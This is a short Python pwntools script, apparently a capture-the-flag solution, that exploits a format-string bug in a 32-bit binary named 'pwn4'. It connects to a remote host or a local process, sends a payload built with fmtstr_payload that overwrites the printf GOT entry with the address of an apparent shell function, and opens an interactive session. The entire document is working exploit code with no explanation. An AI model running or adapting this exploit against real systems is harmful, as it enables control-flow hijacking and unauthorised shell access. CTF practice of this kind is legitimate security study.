#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
context.log_level = 'debug'
context.terminal = ['tmux', 'sp', '-h']
local = 0
if local:
    p = process('./pwn4')
else:
    p = remote('104.154.106.182', 5678)
elf = ELF('./pwn4')
sh = 0x0804853D
printf_got = elf.got['printf']
##  gdb.attach(p)
offset = 48
# payload = '%19$p'
payload = fmtstr_payload(7, {printf_got:sh})
p.sendline(payload)
p.interactive()
